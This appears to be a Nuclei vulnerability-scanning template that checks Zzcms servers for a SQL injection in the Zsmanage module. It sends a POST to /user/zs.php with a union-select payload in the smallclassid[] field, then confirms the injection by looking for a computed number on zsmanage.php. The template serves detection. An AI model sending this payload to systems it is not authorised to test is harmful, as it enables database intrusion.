id: poc-yaml-zzcms-zsmanage-sqli
info:
  name: Zzcms Zsmanage SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in Zzcms Zsmanage module.
http:
  - raw:
      - |
        POST /user/zs.php?do=save HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        proname={{random_str}}&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse={{random_str}}&sx%5B%5D=&sx%5B%5D=&sm={{random_str}}&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20{{random_int_1}}*{{random_int_2}}%23
    extractors:
      - type: regex
        name: calc_result
        part: body
        internal: true
        regex:
          - "{{random_int_1}}\\*{{random_int_2}}"
  - raw:
      - |
        GET /user/zsmanage.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{random_int_1 * random_int_2}}"
      - type: status
        status:
          - 200
variables:
  random_str: '{{rand_base(6)}}'
  random_int_1: '{{rand_int(40000, 44800)}}'
  random_int_2: '{{rand_int(40000, 44800)}}'
